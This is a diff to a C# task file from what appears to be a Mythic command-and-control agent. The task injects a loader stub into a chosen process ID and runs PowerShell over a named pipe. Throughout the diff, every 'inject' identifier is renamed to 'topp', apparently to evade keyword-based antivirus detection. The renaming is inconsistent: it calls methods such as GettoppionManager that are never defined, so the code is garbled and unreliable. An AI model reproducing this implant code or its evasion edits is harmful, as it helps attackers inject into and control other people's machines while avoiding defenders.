@@ -1,10 +1,10 @@
 ﻿#define COMMAND_NAME_UPPER
 
 #if DEBUG
-#define PSINJECT
+#define PStopp
 #endif
 
-#if PSINJECT
+#if PStopp
 
 using System;
 using System.Linq;
@@ -22,10 +22,10 @@ using Interop.Classes.Collections;
 
 namespace Tasks
 {
-    public class psinject : Tasking
+    public class pstopp : Tasking
     {
         [DataContract]
-        internal struct PowerShellInjectParameters
+        internal struct PowerShelltoppParameters
         {
             [DataMember(Name = "pipe_name")]
             public string PipeName;
@@ -46,7 +46,7 @@ namespace Tasks
         private Action<object> _flushMessages;
         private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
         private bool _completed = false;
-        public psinject(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
+        public pstopp(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
             _sendAction = (object p) =>
             {
@@ -103,7 +103,7 @@ namespace Tasks
             MythicTaskResponse resp;
             try
             {
-                PowerShellInjectParameters parameters = _jsonSerializer.Deserialize<PowerShellInjectParameters>(_data.Parameters);
+                PowerShelltoppParameters parameters = _jsonSerializer.Deserialize<PowerShelltoppParameters>(_data.Parameters);
                 if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                     string.IsNullOrEmpty(parameters.PowerShellParameters) ||
                     string.IsNullOrEmpty(parameters.PipeName))
@@ -131,8 +131,8 @@ namespace Tasks
                         if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
                                 out byte[] exeAsmPic))
                         {
-                            var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
-                            if (injector.topp())
+                            var toppor = _agent.GettoppionManager().CreateInstance(exeAsmPic, parameters.PID);
+                            if (toppor.topp())
                             {
                                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                     "",
@@ -140,8 +140,8 @@ namespace Tasks
                                     "",
                                     new IMythicMessage[]
                                     {
-                                        Artifact.ProcessInject(parameters.PID,
-                                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
+                                        Artifact.Processtopp(parameters.PID,
+                                            _agent.GettoppionManager().GetCurrentTechnique().Name)
                                     }));
                                 string cmd = "";
                                 string loadedScript = _agent.GetFileManager().GetScript();
